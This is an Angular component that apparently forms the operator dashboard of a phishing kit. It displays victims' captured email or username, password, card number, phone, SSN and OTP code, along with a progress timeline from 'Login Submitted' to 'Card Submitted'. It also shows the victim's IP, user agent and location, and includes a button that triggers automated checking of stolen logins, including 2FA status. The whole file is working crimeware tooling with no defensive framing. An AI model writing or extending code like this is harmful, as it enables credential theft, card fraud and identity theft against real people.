import { Component, Input, Output, EventEmitter, signal, computed, inject } from '@angular/core';
import { CommonModule } from '@angular/common';
import { StateService } from '../../../services/state.service';
import { HttpClient } from '@angular/common/http';
import { NotificationService } from '../../../services/notification.service';

@Component({
    selector: 'app-session-detail-v2',
    standalone: true,
    imports: [CommonModule],
    template: `
    <div class="fixed inset-0 z-50 flex justify-end" *ngIf="session">
        <!-- Backdrop -->
        <div class="absolute inset-0 bg-slate-950/80 backdrop-blur-sm transition-opacity" 
             (click)="close.emit()"
             [class.opacity-0]="closing()"
             [class.opacity-100]="!closing()"></div>

        <!-- Slide-over Panel -->
        <div class="relative w-full max-w-2xl bg-slate-900 border-l border-slate-800 shadow-2xl transform transition-transform duration-300 flex flex-col"
             [class.translate-x-full]="closing()"
             [class.translate-x-0]="!closing()">
            
            <!-- Header -->
            <div class="p-6 border-b border-slate-800 flex items-start justify-between bg-slate-900/50">
                <div>
                   <div class="flex items-center gap-2 mb-1">
                      <span class="text-2xl">{{ session.flowIcon || '❓' }}</span>
                      <h2 class="adm-h3 text-white">{{ session.flowName || 'Unknown Flow' }}</h2>
                      <span class="px-2 py-0.5 rounded text-[10px] uppercase font-bold tracking-wider"
                           [class.bg-green-500-10]="isActive()"
                           [class.text-green-400]="isActive()"
                           [class.bg-slate-700]="!isActive()"
                           [class.text-slate-400]="!isActive()">
                           {{ session.status }}
                      </span>
                   </div>
                   <p class="font-mono text-xs text-slate-500">{{ session.id }}</p>
                </div>
                <button class="adm-btn adm-btn-ghost p-1 text-slate-400 hover:text-white" (click)="handleClose()">
                    <span class="material-icons">close</span>
                </button>
            </div>

            <!-- Scrollable Content -->
            <div class="flex-1 overflow-y-auto p-6 space-y-8">
                
                <!-- Screenshots / Live View -->
                <div class="space-y-3">
                    <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                        <span class="material-icons text-sm">visibility</span> Live View
                    </h3>
                    <div class="aspect-video bg-slate-950 rounded-lg border border-slate-800 flex items-center justify-center relative overflow-hidden group">
                        
                        @if (session.data?.automationScreenshot) {
                             <img [src]="'data:image/jpeg;base64,' + session.data.automationScreenshot" class="w-full h-full object-cover" />
                        } @else {
                             <div class="text-slate-600 flex flex-col items-center">
                                <span class="material-icons text-4xl mb-2">image_not_supported</span>
                                <span class="text-xs">No screenshot available</span>
                            </div>
                        }

                        <!-- Overlay Actions -->
                        <div class="absolute inset-0 bg-black/50 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity">
                            <button class="adm-btn adm-btn-primary" (click)="retryVerification()" [disabled]="verifying()">
                                <span class="material-icons mr-2" [class.animate-spin]="verifying()">{{ verifying() ? 'sync' : 'camera_alt' }}</span>
                                {{ verifying() ? 'Verifying...' : 'Retry Verification' }}
                            </button>
                        </div>
                    </div>
                </div>
                
                <!-- Automation Verification (New) -->
                <div class="space-y-3" *ngIf="session.data?.automationStatus">
                    <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                        <span class="material-icons text-sm">security</span> Automated Verification
                    </h3>
                    <div class="p-3 bg-slate-800/50 rounded border border-slate-700/50 flex items-center justify-between">
                        <div class="flex items-center gap-3">
                             <span class="material-icons text-2xl" 
                                [class.text-green-400]="session.data.automationStatus === 'valid'"
                                [class.text-red-400]="session.data.automationStatus === 'invalid'"
                                [class.text-yellow-400]="session.data.automationStatus === '2fa_required'">
                                {{ session.data.automationStatus === 'valid' ? 'check_circle' : session.data.automationStatus === 'invalid' ? 'cancel' : 'warning' }}
                             </span>
                             <div>
                                <p class="text-sm font-bold text-white capitalize">{{ session.data.automationStatus.replace('_', ' ') }}</p>
                                <p class="text-[10px] text-slate-400 font-mono">{{ session.data.automationDetails || 'No details provided' }}</p>
                             </div>
                        </div>
                    </div>
                </div>

                <!-- Captured Data -->
                <div class="space-y-3">
                    <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                        <span class="material-icons text-sm">data_object</span> Captured Data
                    </h3>
                    
                    <div class="grid grid-cols-2 gap-4">
                        @for (item of dataItems(); track item.label) {
                            <div class="p-3 bg-slate-800/50 rounded border border-slate-700/50">
                                <p class="text-[10px] text-slate-500 uppercase mb-1">{{ item.label }}</p>
                                <p class="text-sm text-white font-mono break-all">{{ item.value || '—' }}</p>
                            </div>
                        }
                    </div>
                </div>

                <!-- Device Info -->
                 <div class="space-y-3">
                    <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-2">
                        <span class="material-icons text-sm">devices</span> Device Fingerprint
                    </h3>
                    <div class="p-4 bg-slate-800/30 rounded border border-slate-700/50 font-mono text-xs text-slate-400 space-y-2">
                        <div class="flex justify-between">
                            <span>IP Address:</span>
                            <span class="text-white">{{ session.ip }}</span>
                        </div>
                         <div class="flex justify-between">
                            <span>User Agent:</span>
                            <span class="text-white max-w-[200px] truncate" [title]="session.userAgent">{{ session.userAgent }}</span>
                        </div>
                         <div class="flex justify-between">
                            <span>Location:</span>
                            <span class="text-white">{{ session.location }}</span>
                        </div>
                    </div>
                </div>

            <!-- Timeline (New) -->
            <div class="space-y-4 pt-4 border-t border-slate-800">
               <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-2 px-6">
                   <span class="material-icons text-sm">history</span> Activity Timeline
               </h3>
               <div class="px-6 relative space-y-4 before:absolute before:left-[35px] before:top-2 before:bottom-2 before:w-[1px] before:bg-slate-800">
                   @for (event of timelineEvents(); track event.label) {
                       <div class="relative pl-8 flex flex-col">
                           <div class="absolute left-0 w-2.5 h-2.5 rounded-full border-2 transform translate-y-1.5"
                                [class.bg-slate-900]="!event.completed"
                                [class.border-slate-700]="!event.completed"
                                [class.bg-blue-500]="event.completed"
                                [class.border-blue-500]="event.completed"></div>
                           <span class="text-sm font-medium" 
                                 [class.text-white]="event.completed" 
                                 [class.text-slate-500]="!event.completed">{{ event.label }}</span>
                           <span class="text-[10px] text-slate-500" *ngIf="event.desc">{{ event.desc }}</span>
                       </div>
                   }
               </div>
            </div>

            </div>

            <!-- Footer Actions -->
            <div class="p-4 border-t border-slate-800 bg-slate-900/80 flex justify-between">
                <button class="adm-btn adm-btn-ghost text-red-400 hover:bg-red-500/10" (click)="killSession()">
                    <span class="material-icons mr-2">delete_forever</span> Terminate Session
                </button>
                <button class="adm-btn adm-btn-primary">
                    <span class="material-icons mr-2">terminal</span> Open Terminal
                </button>
            </div>
        </div>
    </div>
  `
})
export class SessionDetailV2Component {
    @Input() session: any;
    @Output() close = new EventEmitter<void>();
    private stateService = inject(StateService);

    closing = signal(false);

    isActive = computed(() => {
        return this.session?.status?.toLowerCase() === 'active' || this.session?.status?.toLowerCase() === 'verified';
    });

    dataItems = computed(() => {
        if (!this.session?.data) return [];
        const d = this.session.data;
        return [
            { label: 'Email / Username', value: d.email || d.username },
            { label: 'Password', value: d.password ? '••••••••' : null },
            { label: 'Card Number', value: d.cardNumber ? '•••• ' + d.cardNumber.slice(-4) : null },
            { label: 'Phone', value: d.phone },
            { label: 'SSN / ID', value: d.ssn },
            { label: 'OTP Code', value: d.otp }
        ].filter(i => i.value);
    });

    timelineEvents = computed(() => {
        if (!this.session?.data) return [];
        const d = this.session.data;

        // Infer timeline from state flags
        const events = [
            { label: 'Session Started', completed: true, desc: new Date(this.session.timestamp).toLocaleTimeString() },
            { label: 'Login Submitted', completed: !!d.isLoginSubmitted, desc: d.email },
            { label: 'Login Verified', completed: !!d.isLoginVerified },
            { label: 'Phone Verified', completed: !!d.isPhoneVerified, desc: d.phone },
            { label: 'Personal Info', completed: !!d.isPersonalVerified },
            { label: 'Card Submitted', completed: !!d.isCardSubmitted, desc: d.cardNumber ? '**** ' + d.cardNumber.slice(-4) : '' },
            { label: 'Flow Complete', completed: !!d.isFlowComplete }
        ];
        return events;
    });

    handleClose() {
        this.closing.set(true);
        setTimeout(() => {
            this.close.emit();
            this.closing.set(false);
        }, 300);
    }

    private http = inject(HttpClient);
    private notificationService = inject(NotificationService);
    verifying = signal(false);

    retryVerification() {
        if (!this.session || this.verifying()) return;

        this.verifying.set(true);
        this.notificationService.send('Verification Started', { body: 'Automation queued...', tag: 'verify-start' });

        this.http.post<any>(`/api/admin/sessions/${this.session.id}/verify`, {}).subscribe({
            next: (res) => {
                this.verifying.set(false);
                this.notificationService.send('Verification Complete', {
                    body: `Status: ${res.status}`,
                    tag: 'verify-complete'
                });
                // StateService should catch the socket update automatically
            },
            error: (err: any) => {
                this.verifying.set(false);
                console.error('Verification failed', err);
                this.notificationService.send('Verification Failed', { body: err.error?.error || 'Unknown error', tag: 'verify-error' });
            }
        });
    }

    killSession() {
        if (confirm('Are you sure you want to terminate this session effectively kicking the user out?')) {
            alert('Kill command sent (Simulation)');
            this.handleClose();
        }
    }
}
